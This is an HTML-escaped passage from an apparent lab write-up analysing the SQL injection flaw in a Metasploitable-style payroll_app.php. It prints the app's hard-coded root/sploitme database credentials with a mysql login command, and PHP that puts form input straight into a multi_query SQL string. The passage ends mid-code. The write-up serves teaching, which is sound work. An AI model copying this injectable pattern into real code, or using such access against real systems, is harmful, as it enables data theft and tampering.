      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;@dm1n1str8r&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;mandalorian1&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;my_kinda_skum&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;hanSh0tF1rst&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;rwaaaaawr8&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Daddy_Issues2&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;table&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;center&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
Done&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;vulnerabilities-in-the-payroll_appphp-source-code&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#vulnerabilities-in-the-payroll_appphp-source-code&quot; aria-label=&quot;vulnerabilities in the payroll_appphp source code permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Vulnerabilities in the &lt;code class=&quot;language-text&quot;&gt;payroll_app.php&lt;/code&gt; Source Code&lt;/h4&gt;
&lt;p&gt;OK, that was interesting, but back to business. We are going to analyze the actual web application code that is causing the SQL Injection vulnerability. The previous results from the &lt;code class=&quot;language-text&quot;&gt;find&lt;/code&gt; command indicated that the web application was stored in the default location of &lt;code class=&quot;language-text&quot;&gt;/var/www/html&lt;/code&gt;. The file can easily be viewed using: &lt;code class=&quot;language-text&quot;&gt;cat /var/www/html/payroll_app.php&lt;/code&gt;. After having a quick browse over the code, there are three main blocks:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;PHP code to connect to the database&lt;/li&gt;
&lt;li&gt;HTML code to produce the form on the &lt;em&gt;Payroll App&lt;/em&gt; page&lt;/li&gt;
&lt;li&gt;PHP code to post the contents of the form&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The first part of the &lt;code class=&quot;language-text&quot;&gt;payroll_app.php&lt;/code&gt; code connects to the local MySQL database. The code is listed below for reference.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;token variable&quot;&gt;$conn&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mysqli&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;127.0.0.1&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;root&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;sploitme&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;payroll&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;connect_error&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;Connection failed: &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;connect_error&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Unfortunately, the username and password (and database name) are documented in clear text. The user account is &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt;, the password is &lt;code class=&quot;language-text&quot;&gt;sploitme&lt;/code&gt; and the database name is &lt;code class=&quot;language-text&quot;&gt;payroll&lt;/code&gt;. This information had not yet been found and allows connection to the MySQL database. For example, you could use the command: &lt;code class=&quot;language-text&quot;&gt;mysql -uroot -psploitme&lt;/code&gt; to connect to the MySQL database and execute commands (e.g., replace users, change passwords, remove or add tables etc.).&lt;/p&gt;
&lt;p&gt;The next chunk of the &lt;code class=&quot;language-text&quot;&gt;payroll_app.php&lt;/code&gt; is boring. It is a simple form to let users login. It is displayed below for thoroughness.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token prolog&quot;&gt;&amp;lt;?php
if (!isset($_POST[&apos;s&apos;])) {
?&gt;&lt;/span&gt;

&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;center&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;form&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;post&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;h2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Payroll Login&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;h2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;table&lt;/span&gt; &lt;span class=&quot;token special-attr&quot;&gt;&lt;span class=&quot;token attr-name&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token value css language-css&quot;&gt;&lt;span class=&quot;token property&quot;&gt;border-radius&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 25px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token property&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 2px solid black&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token property&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 20px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;User&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;user&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Password&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;password&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;password&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
       &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;submit&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;OK&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;table&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;form&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;center&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token prolog&quot;&gt;&amp;lt;?php
}
?&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The final portion of the &lt;code class=&quot;language-text&quot;&gt;payroll_app.php&lt;/code&gt; is where the action happens. If a form post is submitted, the following code is executed. Basically, when the form is submitted it executes a query against the database and displays the results of the SQL query in a table. The posted values are, of course, the &lt;code class=&quot;language-text&quot;&gt;username&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;password&lt;/code&gt; values from the HTML login form. The entire block of code is displayed below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;s&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token variable&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token variable&quot;&gt;$pass&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;password&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token variable&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;select username, first_name, last_name, salary from users where username = &apos;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$user&lt;/span&gt;&lt;/span&gt;&apos; and password = &apos;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$pass&lt;/span&gt;&lt;/span&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;multi_query&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
